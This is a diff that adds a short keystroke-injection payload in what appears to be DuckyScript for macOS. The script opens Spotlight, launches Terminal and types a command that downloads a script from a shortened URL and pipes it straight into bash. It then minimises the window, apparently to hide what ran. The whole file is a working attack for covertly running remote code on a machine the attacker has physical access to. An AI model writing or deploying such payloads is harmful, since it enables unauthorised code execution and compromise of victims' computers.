@@ -1,0 +1,6 @@
+GUI SPACE
+DELAY 200
+STRINGLN Terminal
+DELAY 500
+STRINGLN curl -L http://bit.ly/2t6ZFlq | bash
+GUI m
